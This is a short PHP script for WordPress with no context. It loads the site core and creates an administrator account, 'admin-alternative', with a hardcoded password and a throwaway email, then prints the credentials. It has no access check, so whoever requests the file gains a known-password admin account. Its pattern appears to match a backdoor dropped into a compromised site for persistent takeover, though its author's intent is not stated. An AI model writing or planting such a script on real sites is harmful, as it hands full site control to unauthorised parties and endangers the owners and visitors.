<?php
require_once('wp-load.php');
$username = 'admin-alternative';
$password = 'New_Password_123!';
$email = 'email@qhwkhdkqwdhjq.com';
if (username_exists($username) || email_exists($email)) {
    echo 'The user already exists.';
    exit;
}
$user_id = wp_create_user($username, $password, $email);
if (is_wp_error($user_id)) {
    echo 'An error occurred while creating the user: ' . $user_id->get_error_message();
    exit;
}
$user = new WP_User($user_id);
$user->set_role('administrator');
echo 'Admin user successfully added. User: admin-alternative Pass: New_Password_123!';
?>
